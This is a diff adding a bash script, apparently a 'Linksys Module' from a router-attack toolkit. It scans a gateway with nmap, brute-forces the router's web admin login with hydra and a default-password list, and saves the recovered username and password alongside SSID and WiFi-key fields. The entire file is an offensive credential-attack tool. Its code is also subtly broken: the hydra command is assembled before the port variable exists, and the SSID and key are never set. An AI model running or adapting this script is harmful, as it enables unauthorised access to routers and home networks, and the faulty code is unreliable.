@@ -1,0 +1,45 @@
+#!/bin/bash
+
+# Linksys Module
+
+nmap_output="/tmp/menu/router.tmp"
+gateway=$1
+interface=$2
+user=""
+hydra_command="hydra -o /tmp/menu/pass -l admin -P ~/Desktop/current/attack/router/brute/default_pass_list1 -f -e ns $gateway $brute_port-get / "
+
+mkdir /tmp/menu
+
+function display() {                                                                          # Make It Pretty
+      output=""
+      if [ "$1" == "action" ]; then output="\e[01;32m[>]\e[00m"
+      elif [ "$1" == "info" ]; then output="\e[01;33m[i]\e[00m"
+      elif [ "$1" == "diag" ]; then output="\e[01;34m[+]\e[00m"
+      elif [ "$1" == "error" ]; then output="\e[01;31m[!]\e[00m"; fi
+      output="$output $2"
+      echo -e "$output"
+
+      if [ "$diagnostics" == "true" ]; then
+         if [ "$1" == "action" ]; then output="[>]"
+         elif [ "$1" == "info" ]; then output="[i]"
+         elif [ "$1" == "diag" ]; then output="[+]"
+         elif [ "$1" == "error" ]; then output="[!]"
+         fi
+      fi
+}
+
+# Brute Force Attempt
+if [ "$pass" == "" ] ; then
+   nmap -oN $nmap_output -p80,443 $gateway -e $interface
+   brute_port=$(grep open $nmap_output | head -n 1 | awk '{ print $3 }')                         # | sed 's/\/tcp//g')
+   $hydra_command  # Try Default Password
+   user=$(cat /tmp/menu/pass | sed 's/.*login: \(.*\)   password.*/\1/')                         # Get Username
+   pass=$(cat /tmp/menu/pass | awk 'match($0,"password: "){print substr($0,RSTART+10,100)}')     # Get password
+fi
+
+display info "Username      =  \e[01;33m$user\e[00m" > /tmp/menu/router_pass
+display info "Password      =  \e[01;33m$pass\e[00m" >> /tmp/menu/router_pass
+display info "SSID          =  \e[01;33m$ssid\e[00m" >> /tmp/menu/router_pass
+display info "WiFi Key      =  \e[01;33m$wifi_key\e[00m" >> /tmp/menu/router_pass
+# cat /tmp/menu/router_pass
+exit
